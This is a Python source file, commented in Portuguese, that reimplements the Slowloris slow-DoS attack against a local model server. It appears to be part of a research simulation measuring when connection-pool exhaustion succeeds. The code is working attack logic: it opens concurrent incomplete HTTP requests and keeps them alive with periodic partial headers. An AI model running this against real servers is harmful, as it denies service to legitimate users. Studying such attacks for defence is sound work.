"""
slowloris_attacker.py — Reimplementacao do comportamento da ferramenta Slowloris.

Reproduz o ataque Slow DoS descrito na modelagem <N_c, delta, t_k>:
  - abre N_c conexoes concorrentes contra o VulnerableServer;
  - em cada uma envia uma requisicao HTTP GET INCOMPLETA (hc=0), que o servidor
    mantem ocupando uma posicao do pool (nao serve em T_s);
  - a cada delta segundos envia um cabecalho parcial de renovacao em cada conexao,
    resetando o timer de inatividade do servidor (t_k), sem nunca completar;
  - quando N_c >= capacidade do pool, as posicoes esgotam e os clientes legitimos
    passam a ser recusados.

A eficacia exige delta < t_k (renovar antes de expirar) e N_c >= MaxRequestWorkers.
Nao usa a ferramenta 'slowloris' real, que exigiria um Apache real; aqui o alvo e
o servidor-modelo, entao o comportamento e reimplementado (como no LoRDAS/Shrew).
"""
import socket
import threading
import time

from common import make_request_line, now


class SlowlorisAttacker:
    def __init__(self, host="127.0.0.1", port=8080, n_conns=200, delta=5.0,
                 src_ip="10.0.0.1", header_bytes=40, connect_stagger=0.0):
        self.host = host
        self.port = port
        self.n_conns = n_conns
        self.delta = delta
        self.src_ip = src_ip
        self.header_bytes = header_bytes
        self.connect_stagger = connect_stagger
        self.socks = []
        self._msgs = 0                       # nº de envios (inicial + renovacoes)
        self._bytes = 0
        self._lock = threading.Lock()

    def _open_one(self, seq):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((self.host, self.port))
            # requisicao inicial INCOMPLETA (hc=0): o servidor segura a posicao
            line = make_request_line("attacker", seq, self.src_ip, hc=0)
            s.sendall(line)
            with self._lock:
                self._msgs += 1
                self._bytes += len(line)
            return s
        except OSError:
            return None

    def _is_held(self, s):
        """True se a conexao esta SEGURADA (servidor em silencio, ocupando posicao);
        False se foi RECUSADA (RESP_BUSY) ou fechada. Nao-bloqueante."""
        try:
            s.setblocking(False)
            s.recv(64, socket.MSG_PEEK)   # recebeu algo (RESP_BUSY) ou b'' (fechada)
            s.setblocking(True)
            return False
        except BlockingIOError:
            s.setblocking(True)
            return True                   # nada pendente => segurada em silencio
        except OSError:
            return False

    def _renew(self, s):
        # cabecalho parcial de manutencao (nunca termina a requisicao)
        blob = b"X-a: " + b"x" * max(1, self.header_bytes - 6) + b"\n"
        try:
            s.sendall(blob)
            with self._lock:
                self._msgs += 1
                self._bytes += len(blob)
            return True
        except OSError:
            return False

    def run(self, duration):
        """Trava o pool via captura em lotes (fase 1), mantem por renovacao a cada
        delta (fase 2) por 'duration' segundos, depois fecha tudo (recuperacao)."""
        t_end = now() + duration
        seq = 0

        # ------------------------------------------------------------------
        # FASE 1 - captura inicial em LOTES: abre um lote, espera o servidor
        # processar (admitir/recusar), guarda as SEGURADAS e descarta as
        # RECUSADAS. Para quando um lote inteiro e recusado (pool saturado) ou
        # ao atingir N_c conexoes seguradas. Transiente curto para travar o pool.
        # Depois disso o atacante NAO reabre mais conexoes.
        # ------------------------------------------------------------------
        held_socks = []
        last_renew = {}
        grab_deadline = min(now() + 3.0, t_end)
        for s in self.socks:                       # aproveita as ja abertas
            if self._is_held(s):
                held_socks.append(s)
                last_renew[s] = now()
            else:
                try:
                    s.close()
                except OSError:
                    pass
        while now() < grab_deadline and len(held_socks) < self.n_conns:
            batch = []
            for _ in range(min(self.n_conns - len(held_socks), 40)):
                s = self._open_one(seq)
                seq += 1
                if s is not None:
                    batch.append(s)
            time.sleep(0.12)                       # deixa o servidor decidir admit/refuse
            for s in batch:
                if self._is_held(s):
                    held_socks.append(s)
                    last_renew[s] = now()
                else:
                    try:
                        s.close()
                    except OSError:
                        pass
            # nao para no 1o lote recusado: o legitimo segura posicoes transitoriamente,
            # que liberam a cada T_s; insistir pelo prazo garante travar a capacidade.
        self.socks = held_socks

        # ------------------------------------------------------------------
        # FASE 2 - manutencao por RENOVACAO apenas (sem reabrir). Cada conexao e
        # renovada a cada delta. Se delta < t_k, a posicao e mantida viva; se
        # delta > t_k, o servidor derruba a conexao antes da renovacao e a posicao
        # e perdida (o atacante nao a recupera), fazendo o ataque falhar. E aqui
        # que a condicao delta < t_k se manifesta.
        # ------------------------------------------------------------------
        while now() < t_end:
            t = now()
            alive = []
            for s in self.socks:
                if not self._is_held(s):        # derrubada pelo servidor (t_k) -> perdida
                    last_renew.pop(s, None)
                    try:
                        s.close()
                    except OSError:
                        pass
                    continue
                if t - last_renew.get(s, 0) >= self.delta:
                    if self._renew(s):
                        last_renew[s] = t
                        alive.append(s)
                    else:
                        last_renew.pop(s, None)
                else:
                    alive.append(s)
            self.socks = alive
            time.sleep(min(0.2, self.delta / 4.0))

        # fim do ataque: fecha todas as conexoes -> posicoes liberadas
        for s in self.socks:
            try:
                s.close()
            except OSError:
                pass
        self.socks = []

    def message_count(self):
        return self._msgs

    def mean_rate(self, duration):
        """Taxa media de tráfego do atacante (bytes/s) = N_c * s_h / delta agregado."""
        return self._bytes / duration if duration > 0 else 0.0
